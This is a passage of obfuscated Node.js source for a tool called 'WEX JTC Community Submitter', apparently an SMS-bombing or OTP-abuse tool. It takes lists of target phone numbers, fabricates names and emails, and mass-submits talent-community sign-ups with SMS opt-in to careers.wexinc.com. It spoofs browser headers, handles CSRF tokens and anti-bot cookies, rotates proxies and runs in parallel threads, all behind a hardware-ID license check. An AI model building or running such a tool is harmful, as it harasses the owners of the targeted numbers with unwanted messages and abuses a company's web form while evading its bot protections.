      category: v237
    } = v224,
    v238 = randomUUID(),
    v239 = v226,
    v240 = new Date(),
    v241 = v240.toISOString();
  const v242 = v240.getUTCFullYear() + '-' + String(v240.getUTCMonth() + 0x1).padStart(0x2, '0') + '-' + String(v240.getUTCDate()).padStart(0x2, '0') + '\x20' + String(v240.getUTCHours()).padStart(0x2, '0') + ':' + String(v240.getUTCMinutes()).padStart(0x2, '0') + ':' + String(v240.getUTCSeconds()).padStart(0x2, '0'),
    v243 = Math.floor(Math.random() * 0x61a8) + 0x4e20,
    v244 = new Date(Date.now() - v243).toISOString(),
    v245 = {
      'firstName': v230,
      'lastName': v231,
      'email': v232,
      'phoneNumber': String(v233 || "2125550100").replace(/[^0-9]/g, ''),
      'category': v237 || "Finance and Administration",
      'city': v234 || "asdsa",
      'smsOptIn': true,
      'username': v232,
      'stepNum': "jointalentcommunity",
      'applyType': "JTC",
      'loginType': "registration",
      'isJtnApply': "true",
      'jobId': "JOBID",
      'jobTitle': "JOBTITLE",
      'jobSeqNo': "JOBSEQNO",
      'apTxnId': v238,
      'isLastStep': true,
      'country': v235 || "Austria",
      'state': v236 || "Burgenland",
      'locale': "en_us",
      'jtcTxnId': v239,
      'applySource': "applyStudio"
    },
    v246 = v227.isMobile,
    v247 = {};
  v247.trait27 = v232;
  v247.trait254 = "JTC", v247.trait253 = "jointalentcommunity", v247.refNum = "WEXWEXUS", v247.trait2 = "WEXWEXUS", v247.trait65 = v246 ? "mobile" : "desktop", v247.device = '';
  v247.uas = v227.userAgent, v247.trait79 = "en_us", v247.trait143 = "en_us", v247.trait145 = "direct", v247.trait76 = "jointalentcommunity", v247.trait28 = "JTC Apply", v247.trait5 = "JOBSEQNO", v247.trait132 = "JOBTITLE", v247.trait14 = '', v247.trait258 = "external", v247.pt_page = "https://careers.wexinc.com/us/en/jointalentcommunity", v247.pt_UTC_timestamp = v241;
  v247.current_url = "https://careers.wexinc.com/us/en/jointalentcommunity", v247.trait255 = '', v247.jobId = '', v247.initialReferral = "direct", v247.apTxnId = v238, v247.jtcTxnId = v239, v247.utm_source = '', v247.utm_medium = '', v247.utm_campaign = '', v247.utm_term = '', v247.pt_timestamp = v242, v247.trait257 = '1', v247.firstName = v230, v247.lastName = v231;
  const v248 = v247,
    v249 = {};
  v249.additionalAttachments = [];
  const v250 = {};
  v250.stepStartTime = v244, v250.stepSubmissionTime = v241, v250.stepNum = 0x0, v250.stepName = 0x1, v250.stepData = {};
  const v251 = Object.assign({}, v248, {
      'cookie_enabled': true,
      'screen_height': v246 ? 0x34c : 0x438,
      'screen_width': v246 ? 0x186 : 0x780,
      'lib_version': '',
      'eventPropertyDataMap': Object.assign({}, v248, {
        'form_step_data': Object.assign({}, v245, v249),
        'stepInfo': [v250]
      })
    }),
    v252 = {};
  v252.eventData = v251, v252.siteType = "external", v252.applyPlatform = "applyStudio";
  const v253 = JSON.stringify({
      'ddoKey': "applySubmit",
      'formData': Object.assign({}, v245, v252)
    }),
    v254 = {
      'accept': "application/json, text/plain, */*",
      'accept-language': "en-US,en;q=0.9",
      'content-type': "application/json",
      'origin': "https://careers.wexinc.com",
      'referer': "https://careers.wexinc.com/us/en/jointalentcommunity",
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "same-origin",
      'user-agent': v227.userAgent,
      'x-csrf-token': v226,
      'cookie': v225.get()
    };
  if (v227.clientHints) for (const [v255, v256] of Object.entries(v227.clientHints)) {
    if (v256 !== undefined && v256 !== null) v254[v255] = v256;
  }
  return sendRequest('https://careers.wexinc.com/applySubmit', "POST", v254, v253, v228, v229);
}
class Dashboard {
  constructor(v257) {
    this.total = v257;
    this.successful = 0x0, this.failed = 0x0, this.processed = 0x0, this.startTime = Date.now();
  }
  ["log"](v258) {
    process.stdout.write("\r[2K" + v258 + '\x0a');
    this.render();
  }
  ["render"]() {
    const v259 = Math.round(this.processed / Math.max(this.total, 0x1) * 0x64);
    const v260 = Math.round(v259 / 0x5),
      v261 = CY('█'.repeat(v260)) + G('░'.repeat(0x14 - v260)),
      v262 = '\x20\x20' + CY("NOT REXY") + G(" ⮞ ") + v261 + Y('\x20' + v259 + '%') + G("  │  ") + GR('✓\x20' + this.successful) + G('\x20\x20') + RE('✗\x20' + this.failed) + G("  [" + this.processed + '/' + this.total + ']');
    process.stdout.write("\r[2K" + v262);
  }
  ["stop"]() {
    process.stdout.write("\r[2K\n");
  }
}
let globalDashboard = null;
async function processEntry(v263, v264, v265, v266, v267) {
  const {
    proxy: v268,
    timeout: v269
  } = v264;
  const v270 = String(v263.displayPhone || v263.phone || v263.email || "entry-" + v266).trim().replace(/^\+/, ''),
    v271 = String(v267).length,
    v272 = G("  [" + String(v266).padStart(v271, '0') + '/' + v267 + ']');
  try {
    const v273 = new CookieJar(),
      v274 = getRandomClient(),
      {
        csrfToken: v275,
        pageStatus: v276
      } = await fetchWexSession(v273, v274, v268, v269);
    if (!v275) {
      v265.fail++;
      globalDashboard && (globalDashboard.failed++, globalDashboard.processed++);
      const v281 = v276 === 0x193 ? "ERR_BLOCKED" : v276 === 0x1ad ? "ERR_RATELIMIT" : "ERR_NO_CSRF";
      fs.appendFileSync(FAILED_FILE, v270 + " → " + v281 + '\x0a', "utf8");
      const v282 = Object.keys(v273.store);
      debugLog(v270, "session_block", {
        'pageStatus': v276,
        'code': v281,
        'proxy': v268 ? v268.host + ':' + v268.port : "direct",
        'client': v274.name,
        'cookiesReceived': v282,
        'hasPlaySession': v273.has("PLAY_SESSION"),
        'hasReese84': v273.has("reese84")
      });
      globalDashboard ? globalDashboard.log(v272 + RE(" ✗ NOT REXY     │ " + v270 + " → " + v281)) : console.log(v272 + RE(" ✗ NOT REXY     │ " + v270 + " → " + v281));
      return;
    }
    const v277 = await submitJTC(v263, v273, v275, v274, v268, v269);
    let v278 = null;
    try {
      v278 = JSON.parse(v277.data);
    } catch (v283) {}
    const v279 = v278 && v278.applySubmit && (v278.applySubmit.STATUS || v278.applySubmit.response && v278.applySubmit.response.status) || '',
      v280 = String(v279).toLowerCase() === "success";
    if (v280) v265.ok++, globalDashboard && (globalDashboard.successful++, globalDashboard.processed++), fs.appendFileSync(SUCCESSFUL_FILE, v270 + '\x0a', "utf8"), debugLog(v270, "success", {
      'status': v277.status,
      'phone': v263.phone,
      'email': v263.email,
      'country': v263.country,
      'state': v263.state,
      'csrfToken': v275,
      'client': v274.name,
      'cookieKeys': Object.keys(v273.store),
      'hasReese84': v273.has("reese84"),
      'response': v278 ? v278.applySubmit : v277.data
    }), globalDashboard ? globalDashboard.log(v272 + GR(" ✓ NOT REXY     │ " + v270 + " → SUCCESS")) : console.log(v272 + GR(" ✓ NOT REXY     │ " + v270 + " → SUCCESS"));else {
      v265.fail++;
      globalDashboard && (globalDashboard.failed++, globalDashboard.processed++);
      const v284 = v278 && v278.applySubmit && v278.applySubmit.STATUS || v278 && (v278.error || v278.code) || "HTTP_" + v277.status;
      fs.appendFileSync(FAILED_FILE, v270 + " → " + v284 + '\x0a', "utf8"), debugLog(v270, "submit_fail", {
        'status': v277.status,
        'client': v274.name,
        'serverStatus': v279 || "failure",
        'phone': v263.phone,
        'phoneNumber': String(v263.phone || '').replace(/[^0-9]/g, ''),
        'country': v263.country,
        'state': v263.state,
        'csrfToken': v275 ? v275.substring(0x0, 0x8) + "..." : null,
        'cookieKeys': Object.keys(v273.store),
        'hasPlaySession': v273.has("PLAY_SESSION"),
        'hasReese84': v273.has("reese84"),
        'response': v278 || v277.data.slice(0x0, 0x258)
      }), globalDashboard ? globalDashboard.log(v272 + RE(" ✗ NOT REXY     │ " + v270 + " → " + v284)) : console.log(v272 + RE(" ✗ NOT REXY     │ " + v270 + " → " + v284));
    }
  } catch (v285) {
    v265.fail++;
    globalDashboard && (globalDashboard.failed++, globalDashboard.processed++);
    const v286 = v285.message.includes("timeout") ? "ERR_TIMEOUT" : v285.message.includes("unreachable") ? "ERR_PROXY" : "ERR_" + v285.message.replace(/\s+/g, '_').toUpperCase().slice(0x0, 0x1e);
    fs.appendFileSync(FAILED_FILE, v270 + " → " + v286 + '\x0a', "utf8");
    const v287 = {};
    v287.error = v285.message, debugLog(v270, "exception", v287), globalDashboard ? globalDashboard.log(v272 + RE(" ✗ NOT REXY     │ " + v270 + " → " + v286)) : console.log(v272 + RE(" ✗ NOT REXY     │ " + v270 + " → " + v286));
  }
}
const FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth", "Kevin", "Brian", "George", "Timothy", "Ronald", "Jason", "Edward", "Jeffrey", "Ryan", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Melissa", "Deborah", "Stephanie", "Rebecca", "Laura", "Sharon", "Cynthia", "Kathleen"],
  LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts"];
const CATEGORIES = ["Finance and Administration", "Information Technology", "Human Resources", "Sales", "General Management", "Operations/Manufacturing", "Marketing/Business Development", "Product Development/Engineering", "Service/Support"],
  EMAIL_DOMAINS = ["gmail.com", "outlook.com", "yahoo.com", "icloud.com", "hotmail.com"];
function randChoice(v288) {
  return v288[Math.floor(Math.random() * v288.length)];
}
function generateUniquePhone(v289) {
  const v290 = v289 && v289.length ? randChoice(v289) : "207",
    v291 = Math.floor(0x1e8480 + Math.random() * 0x7a11ff);
  return '' + v290 + v291;
}
function generateUniqueEmail(v292, v293) {
  const v294 = v292.toLowerCase().replace(/[^a-z]/g, ''),
    v295 = v293.toLowerCase().replace(/[^a-z]/g, ''),
    v296 = Math.floor(0x64 + Math.random() * 0x2327);
  const v297 = randChoice(EMAIL_DOMAINS),
    v298 = [v294 + '.' + v295 + v296 + '@' + v297, '' + v294 + v295 + v296 + '@' + v297, v294 + '_' + v295 + v296 + '@' + v297, v295 + '.' + v294 + v296 + '@' + v297];
  return randChoice(v298);
}
function generateProfileForNumber(v299) {
  const v300 = typeof v299 === "object" && v299 !== null ? v299.phone || v299.number || v299.raw || '' : String(v299 || '');
  let v301 = v300.replace(/[^0-9]/g, '');
  v301.length > 0xa && v301.startsWith('1') && (v301 = v301.slice(0x1));
  const v302 = randChoice(FIRST_NAMES),
    v303 = randChoice(LAST_NAMES),
    v304 = generateUniqueEmail(v302, v303),
    v305 = randChoice(CATEGORIES),
    v306 = randChoice(["asdsa", "Eisenstadt", "Rust", "Neusiedl", "Mattersburg", "Oberwart"]),
    v307 = v301;
  const v308 = {};
  v308.firstName = v302, v308.lastName = v303, v308.email = v304, v308.phone = v301, v308.displayPhone = v307, v308.rawPhone = v307;
  v308.city = v306, v308.state = "Burgenland", v308.country = "Austria", v308.category = v305;
  return v308;
}
function loadLines(v309) {
  if (!v309 || !v309.trim()) return [];
  const v310 = path.resolve(v309.trim());
  if (!fs.existsSync(v310)) return [];
  return fs.readFileSync(v310, "utf8").split('\x0a').map(v311 => v311.trim()).filter(v312 => v312 && !v312.startsWith('#') && !v312.startsWith('//'));
}
async function selectOption(v313, v314) {
  return new Promise(v315 => {
    let v316 = 0x0;
    process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn3 = () => {
      process.stdout.write("[2J[H");
      printHeader();
      console.log("   [33m" + v313 + "[0m\n"), v314.forEach((v317, v318) => {
        v318 === v316 ? console.log("   [36m➔[35m " + v317.name + "[0m") : console.log("     [90m" + v317.name + "[0m");
      });
    };
    fn3();
    const fn4 = (v319, v320) => {
      if (!v320) return;
      if (v320.ctrl && v320.name === 'c') process.exit(0x0);
      if (v320.name === 'up') v316 = (v316 - 0x1 + v314.length) % v314.length, fn3();else {
        if (v320.name === "down") v316 = (v316 + 0x1) % v314.length, fn3();else {
          if (v320.name === "return") {
            if (process.stdin.isTTY) process.stdin.setRawMode(false);
            process.stdin.removeListener("keypress", fn4), setTimeout(() => v315(v314[v316].value), 0x3c);
          }
        }
      }
    };
    process.stdin.on("keypress", fn4);
  });
}
async function promptText(v321, v322) {
  return new Promise(v323 => {
    process.stdout.write("   [33m" + v321 + "[0m ");
    let v324 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn5 = v325 => {
      const v326 = v325.toString();
      if (v326.includes('\x0a') || v326.includes('\x0d')) {
        process.stdin.removeListener("data", fn5), v324 += v326.split(/[\r\n]/)[0x0];
        let v327 = v324.trim();
        if (v327.startsWith('\x22') && v327.endsWith('\x22')) v327 = v327.slice(0x1, -1);
        v323(v327 || v322);
      } else v324 += v326;
    };
    process.stdin.on("data", fn5);
  });
}
async function interactiveWizard() {
  let v328 = 0x1,
    v329 = "file",
    v330 = "numbers.txt",
    v331 = 0xa,
    v332 = '',
    v333 = "proxies.txt",
    v334 = 0x3;
  while (true) {
    process.stdout.write("[2J[H"), printHeader();
    if (v328 === 0x1) {
      const v336 = {};
      v336.name = "📁 Load from file (numbers.txt)", v336.value = "file";
      const v337 = {};
      v337.name = "❌ Exit Program", v337.value = "exit";
      const v338 = await selectOption("SELECT NUMBER SOURCE", [v336, v337]);
      if (v338 === "exit") process.exit(0x0);
      v329 = v338, v328 = 0x2;
    } else {
      if (v328 === 0x2) {
        if (v329 === "file") {
          const v339 = {};
          v339.name = "✏️ Custom File Path", v339.value = "custom";
          const v340 = {};
          v340.name = "⬅️ Go Back to Number Source", v340.value = "back";
          const v341 = await selectOption("SELECT TARGET NUMBERS FILE", [v339, v340]);
          if (v341 === "back") {
            v328 = 0x1;
            continue;
          }
          if (v341 === "custom") {
            const v342 = await promptText("Enter Numbers File Path:", "numbers.txt");
            if (v342.toLowerCase() === "back") continue;
            v330 = v342;
          } else v330 = v341;
          if (!fs.existsSync(v330)) fs.writeFileSync(v330, '');
          v328 = 0x3;
        } else {
          if (v329 === "manual") {
            const v343 = await promptText("Enter target US Phone Number (e.g. 2694504648 or 'back'):", '');
            if (v343.toLowerCase() === "back") {
              v328 = 0x1;
              continue;
            }
            const v344 = v343.replace(/[^0-9]/g, '');
            if (!v344 || v344.length < 0xa) {
              console.error(RE("  ✗ Invalid phone number. Must be at least 10 digits.")), await new Promise(v345 => setTimeout(v345, 0x5dc));
              continue;
            }
            v332 = v344, v328 = 0x3;
          } else {
            if (v329 === "auto") {
              const v346 = await promptText("How many numbers to process? (or 'back') [default: 10]:", '10');
              if (v346.toLowerCase() === "back") {
                v328 = 0x1;
                continue;
              }
              v331 = Math.max(0x1, parseInt(v346) || 0xa), v328 = 0x3;
            }
          }
        }
      } else {
        if (v328 === 0x3) {
          const v347 = {};
          v347.name = "✏️ Custom File Path", v347.value = "custom";
          const v348 = {};
          v348.name = "🚫 None (Direct Connection)", v348.value = "none";
          const v349 = {};
          v349.name = "⬅️ Go Back to Numbers Selection", v349.value = "back";
          const v350 = await selectOption("SELECT PROXIES FILE", [v347, v348, v349]);
          if (v350 === "back") {
            v328 = 0x2;
            continue;
          }
          if (v350 === "custom") {
            const v351 = await promptText("Enter Proxies File Path:", "proxies.txt");
            if (v351.toLowerCase() === "back") continue;
            v333 = v351;
          } else v350 === "none" ? v333 = '' : v333 = v350;
          v328 = 0x4;
        } else {
          if (v328 === 0x4) {
            const v352 = {};
            v352.name = "1 Thread", v352.value = 0x1;
            const v353 = {};
            v353.name = "10 Threads (Extreme)", v353.value = 0xa;
            const v354 = await selectOption("SELECT THREADS", [v352, {
              'name': "3 Threads (Default)",
              'value': 0x3
            }, {
              'name': "5 Threads (Fast)",
              'value': 0x5
            }, v353, {
              'name': "⌨️ Custom...",
              'value': "custom"
            }, {
              'name': "⬅️ Go Back to Proxies Selection",
              'value': "back"
            }]);
            if (v354 === "back") {
              v328 = 0x3;
              continue;
            }
            if (v354 === "custom") {
              const v355 = await promptText("Enter custom number of threads [1-10]:", '3');
              if (v355.toLowerCase() === "back") continue;
              v334 = Math.max(0x1, Math.min(0xa, parseInt(v355) || 0x3));
            } else v334 = v354;
            v328 = 0x5;
          } else {
            if (v328 === 0x5) break;
          }
        }
      }
    }
  }
  if (process.stdin.isTTY) process.stdin.setRawMode(false);
  const v335 = {};
  v335.numSource = v329, v335.numbersFile = v330, v335.autoCount = v331;
  return v335.manualNumber = v332, v335.proxiesFile = v333, v335.threads = v334, v335.timeout = 0x7530, v335;
}
async function main() {
  const v356 = generateHWID();
  !v356 && (console.error(RE("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(0x1));
  const v357 = generateHWID();
  v357 !== v356 && (console.error(RE("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(0x1));
  globalHwid = v356, printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + CY("WEX JTC Community Submitter  ") + W('│')), console.log(W("│ [•] Your HWID : ") + Y(v356.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + CY("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
  let v358 = false,
    v359 = "Licensed";
  const v360 = Date.now();
  try {
    const v376 = await new Promise((v377, v378) => {
      const v379 = {};
      v379.hwid = v356, v379.app_id = "wex", v379.version = "1.0.0", v379.timestamp = v360;
      const v380 = JSON.stringify(v379);
      const v381 = {
          'hostname': "188.137.176.163",
          'port': 0xec1,
          'path': "/api/verify",
          'method': "POST",
          'headers': {
            'Content-Type': "application/json",
            'Content-Length': Buffer.byteLength(v380)
          },
          'timeout': 0x2710
        },
        v382 = http.request(v381, v383 => {
          let v384 = '';
          v383.on("data", v385 => v384 += v385), v383.on("end", () => {
            try {
              v377(JSON.parse(v384));
            } catch (v386) {
              v378(v386);
            }
          });
        });
      v382.on("error", v378), v382.on("timeout", function () {
        this.destroy();
        v378(new Error("Timeout"));
      }), v382.write(v380);
      v382.end();
    });
    if (v376) {
      v376.status === "update_required" && (console.error(RE("\n  ✗ Update required! Please download the latest version.\n")), process.exit(0x1));
      if (v376.status === "banned" || v376.status === "expired" || !v376.sig) {
        await new Promise(v391 => setTimeout(v391, 0x5dc));
        let v390 = String(v376.reason || "NOT REGISTERED");
        if (!v376.reason && !v376.sig) v390 = "NOT REGISTERED / REMOVED";
        console.error(RE("\n  ╔══════════════════════════════════════════════╗")), console.error(RE("  ║    ✗ UNAUTHORIZED HARDWARE — WEX TOOL        ║")), console.error(RE("  ╠══════════════════════════════════════════════╣")), console.error(RE("  ║  HWID   : ") + Y(v356.padEnd(0x21)) + RE('║')), console.error(RE("  ║  Status : " + v390.padEnd(0x1a) + '║')), console.error(RE("  ║  Contact: t.me/Rex_OTP_Tool to register      ║")), console.error(RE("  ╚══════════════════════════════════════════════╝\n")), process.exit(0x1);
      }
      const v387 = v356 + "|wex|1.0.0|" + v360,
        v388 = v356 + "|azamtv|1.0.0|" + v360;
      !verifyServerSignature(v387, v376.sig) && !verifyServerSignature(v388, v376.sig) && (console.error(RE("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(0x1));
      v358 = true, v359 = v376.user || "Licensed";
      let v389 = v376.token;
      v389 && setInterval(() => {
        if (!v389) return;
        const v392 = {};
        v392.hwid = v356, v392.app_id = "wex", v392.token = v389;
        const v393 = JSON.stringify(v392),
          v394 = {
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/ping",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v393)
            },
            'timeout': 0x1388
          },
          v395 = http.request(v394, v396 => {
            let v397 = '';
            v396.on("data", v398 => v397 += v398), v396.on("end", () => {
              try {
                const v399 = JSON.parse(v397);
                if (v399.status === 'ok' && v399.token) v389 = v399.token;
              } catch (v400) {}
            });
          });
        v395.on("error", () => {}), v395.write(v393), v395.end();
      }, 0xafc8);
    }
  } catch (v401) {
    console.error(RE("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(RE("    Please check your internet connection or try again later.\n")), process.exit(0x1);
  }
  !v358 && (console.error(RE("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1));
  const v361 = await interactiveWizard(),
    v362 = generateHWID();
  v362 !== v356 && (console.error(RE("\n  ✗ CRITICAL SECURITY ALERT: Runtime memory injection detected.")), console.error(RE("  ✗ HWID mismatch during execution sequence. Aborting...\n")), process.exit(0x1));
  printHeader(), console.log(GR("  ✓ License: " + v359) + G(" | HWID: " + v356));
  let v363 = [],
    v364 = '';
  if (v361.numSource === "auto") {
    const v402 = {};
    v402.length = v361.autoCount, v363 = Array.from(v402, () => generateUniquePhone()), v364 = "Auto-generated " + v361.autoCount + " random numbers";
  } else {
    if (v361.numSource === "manual") v363 = [v361.manualNumber], v364 = "Single target number: " + v361.manualNumber;else {
      const v403 = path.resolve(v361.numbersFile);
      !fs.existsSync(v403) && (console.error(RE("✗ Error: Numbers file not found: " + v403)), process.exit(0x1)), v363 = fs.readFileSync(v403, "utf8").split(/\r?\n/).map(v404 => v404.trim().replace(/^\+/, '')).filter(v405 => v405 && !v405.startsWith('#') && !v405.startsWith('//') && v405.replace(/[^0-9]/g, '').length >= 0x7), v364 = "Loaded " + v363.length + " numbers from " + path.basename(v361.numbersFile);
    }
  }
  !v363.length && (console.error(RE("\n  ✗ No valid numbers found. Add phone numbers to " + v361.numbersFile + '\x0a')), process.exit(0x1));
  let v365 = [];
  if (v361.proxiesFile) {
    const v406 = path.resolve(v361.proxiesFile);
    let v407 = loadLines(v406);
    !v407.length && fs.existsSync(path.join(__dirname, v361.proxiesFile)) && (v407 = loadLines(path.join(__dirname, v361.proxiesFile))), v365 = v407.map(parseProxy).filter(Boolean);
  }
  const v366 = setupOutputDirectory();
  console.log(CY("  ✓ Target  : " + v364)), console.log(v365.length ? CY("  ✓ Proxies : " + v365.length) : G("  ⚠ Proxies : None (Direct Connection)")), console.log(CY("  ✓ Threads : " + v361.threads)), console.log(CY("  ✓ Timeout : " + v361.timeout / 0x3e8 + 's')), console.log(CY("  📁 Output : " + v366 + '\x0a'));
  const v367 = {};
  v367.input = process.stdin, v367.output = process.stdout;
  const v368 = readline.createInterface(v367);
  await new Promise(v408 => v368.question(W("  Press ENTER to start execution (Ctrl+C to cancel)..."), v408)), v368.close(), printHeader(), console.log(CY("  ✓ Tasks   : " + v363.length + '\x20(' + v364 + ')')), console.log(CY("  ✓ Threads : " + v361.threads)), console.log(CY("  ✓ Proxies : " + (v365.length || "Direct") + '\x0a'));
  const v369 = {};
  v369.ok = 0x0, v369.fail = 0x0;
  const v370 = v369;
  globalDashboard = new Dashboard(v363.length), globalDashboard.render();
  const v371 = v361.numSource === "file" && v361.numbersFile ? path.resolve(v361.numbersFile) : null;
  function fn6(v409) {
    try {
      if (!v371 || !fs.existsSync(v371)) return;
      const v410 = fs.readFileSync(v371, "utf8"),
        v411 = String(v409 || '').replace(/[^0-9]/g, ''),
        v412 = v410.split(/\r?\n/).filter(v413 => {
          const v414 = v413.replace(/[^0-9]/g, '');
          if (!v414) return false;
          return v414 !== v411 && v413.trim() !== String(v409).trim();
        }).join('\x0a');
      fs.writeFileSync(v371, v412, "utf8");
    } catch (v415) {}
  }
  let v372 = 0x0;
  const fn7 = () => v365.length ? v365[v372++ % v365.length] : null,
    v373 = v363.map((v416, v417) => v417),
    v374 = [];
  for (let v418 = 0x0; v418 < v361.threads; v418++) {
    v374.push((async () => {
      while (v373.length > 0x0) {
        const v419 = v373.shift();
        if (v419 === undefined) break;
        const v420 = v363[v419];
        fn6(v420);
        const v421 = generateProfileForNumber(v420);
        await processEntry(v421, {
          'proxy': fn7(),
          'timeout': v361.timeout
        }, v370, v419 + 0x1, v363.length), !v365.length && v373.length > 0x0 && (await new Promise(v422 => setTimeout(v422, 0x4b0)));
      }
    })());
  }
  await Promise.all(v374), globalDashboard.stop();
  const v375 = '█'.repeat(0x14);
  console.log("\n\n  " + CY("NOT REXY") + " ⮞ " + Y(v375) + " 100%  │  " + GR('✓ 0') + '\x20\x20' + RE('✗ 0') + '\x20\x20' + G('[' + v363.length + '/' + v363.length + ']'));
  console.log('\x0a' + W("┌──────────────────────────────────────────────┐")), console.log(W('│') + GR("           ✓ RUN COMPLETE                    ") + W('│')), console.log(W("│  Success : ") + GR(String(0x0).padEnd(0x22)) + W('│')), console.log(W("│  Failed  : ") + RE(String(0x0).padEnd(0x22)) + W('│')), console.log(W("│  Output  : ") + CY(v366.slice(0x0, 0x22).padEnd(0x22)) + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
}
main().catch(v423 => {
  console.error(RE("\n  [FATAL] " + v423.message));
  process.exit(0x1);
});
function fn1() {
  const v424 = ['BNvTyMvYC0zPBgu', 'CMvUzgvY', 'BwzYz0K', 'CgfcuNu', 'AvbOB25Lide0ifbYBYbnyxG', 'sK9csuq', 'q2rKuvy', 'sLbdqwy', 'C2v0', 'AvPLDuO', 'Ahr0ChmTChjVEhKTywDLBNq', 'sLfTwfy', 'w1nfvfvqxsbezxbLBMrLBMnPzxmGAw5ZDgfSBgvKihn1y2nLC3nMDwXSEsek', 'twfYEq', 'Ce5eDeC', 'tMvSC29U', 'ChjVDg9JB2W', 'mtDFmv8Y', 'v0vyiePuqYbdB21TDw5PDhKGu3vIBwL0DgvYica', 'AvbOB25Lide0ifbYBW', 'qNjVD24', 'AM9Iswq', 't2jLCNDHCNq', 'mtzFnL8X', 'y2fSBa', 'shvTyw4GuMvZB3vYy2vZ', 'iK1Py3jVC29MDcbfzgDLiJT2psi', 'rvjsx1rjtuvpvvq', '4PscifVIGkjDifrHCMDLDcaGica6ia', 'EvzvDw4', 'uuH6BwW', 'icaGg1SZm20', 'qNjPyw4', 'qu5lsu5hlq', 'yxv0BW', 'DgHLBG', 't25LugX1CYaXmG', 'uuDNA2C', 'ywn0Aw9U', 'vKLtsvrfrf9dt1vovfjz', 'C3rYAw5N', 'sK9cu0vrtK8', 'suPov1q', 'zxHWAxjLza', 'C21nEhi', 'y29UDgvUDc1LBMnVzgLUzW', 'C3rLCerHDge', 'zxjbCuO', 'Bu9ACKW', 'y3vYCMvUDf91CMW', 'DvviDfG', 'vKLtsvrfrf9mqu5h', '4QYf77IpieDViejHy2SGDg8GtNvTyMvYifnVDxjJzq', 'y29Kzq', 'D2HPBguGkhrYDwuPihT9', 'odmY', 'qxrSyw50yq', 'sK9cveLuteu', 'CMf3ugHVBMu', 'mtCUnq', 'BuHpDeG', 'Dc5Tzs9Zy3jHCgvYx2TPBMCGicaGicaGicaGica', 'u00TrZK5mui', 'zgLYzwn0', 'q1PWCKq', 'u2jSyKi', 'u00TuZKXmui', 'C3rLCe51Bq', 'ugf0CMLJAwe', 'id09pqO', 'y29YCW', '4PscifVIGkjDifLVDxiGsfDjrca6ia', 'rwXPEMfIzxrO', 'Fgf6yw10DNWXlJaUmhW', 'ndCW', 'B3v0Bg9VAY5JB20', 'DxrTx2nHBxbHAwDU', 'zxzLBNreyxrH', 'yxbWBhK', 'icdIMQaGuhjVEgLLCYa6ie5VBMuGkerPCMvJDcbdB25Uzwn0Aw9Ukq', 'tMD1EwvU', 'CNDhsKu', 's2vUBMv0Aa', 'uM9KCMLNDwv6', 'zLfjtwy', 'vgLTzw91Da', 'mZmY', 'yxbWzw5KrMLSzvn5BMm', 'BgfZDe5HBwu', 'u2vYDMLJzs9tDxbWB3j0', 'vhPesxq', 'q1bimJuYnq', 'sgDdCNC', 'AvbOB25LmtuSmG', 'q1bimJm1nW', 'EMXPyG', 'uM9Izxj0', 'C2LUC1e', 'q0rNDKq', 'qw5KCM9PzcbdAhjVBwuG', 'rg9UywXK', 'ugHPBgfKzwXWAgLH', 'icdILAdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILzdILAm', 'Au9tienOCM9TzsaO', 'mZa1', 'zxHPDa', 'icbqCMvZCYbftLrfuIb0BYbZDgfYDcbLEgvJDxrPB24Gken0CMWRqYb0BYbJyw5JzwWPlI4U', '4PYxievYCM9YoIboDw1IzxjZigzPBguGBM90igzVDw5KoIa', '4QYf77IpieDViejHy2SGDg8GuhjVEgLLCYbtzwXLy3rPB24', 'zgfYAW', 't2npqwu', 'v0HsB0q', 'ndy5', 'y2HHBgS', 'DhjHAxqYnW', 'z2v0vvrdrNvSBfLLyxi', 'senxtxO', 'BNP5Dhy', 'uK1ymZm2mW', '8j+tGsbmB2fKigzYB20GzMLSzsaOBNvTyMvYCY50EhqP', 'z3jHEq', 'tM90AgLUzW', 'C3rHDhvZq29Kzq', 'ndGW', 'Aw9Zx2nOCM9Tzq', 'C3rHCNrZv2L0Aa', 'AvbOB25LmtuSnq', 'tg9ZiefUz2vSzxm', 'ihWGsfDjrdOG', 'ELnzuuS', 'DhHmvgW', 'rgf2Axm', 'u00Tqtm1nKi', 'z01hBMS', 'DxrTx21LzgL1Bq', 'iokgKIa', 'q2fSAwzVCM5Pyq', 'mJeZ', 'qMv0DhK', 